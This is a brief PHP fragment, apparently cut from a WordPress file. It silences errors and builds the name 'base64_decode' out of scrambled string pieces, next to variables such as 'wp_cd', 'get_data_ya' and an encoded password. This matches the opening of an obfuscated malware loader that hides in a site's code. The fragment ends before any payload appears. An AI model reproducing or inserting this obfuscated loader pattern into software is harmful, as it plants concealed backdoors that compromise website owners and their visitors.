...
error_reporting(0);
if (!$npDcheckClassBgp) {
$ea = "_shaesx_"; $ay = "get_data_ya"; $ae = "decode"; $ea = str_replace("_sha", "bas", $ea); $ao = "wp_cd"; $ee = $ea.$ae; $oa = str_replace("sx", "64", $ee); $algo = "default"; $pass = "Zgc5c4MXrKk0ZQwD69BWJ/PdPFbQdr9dm2WSGbE=";
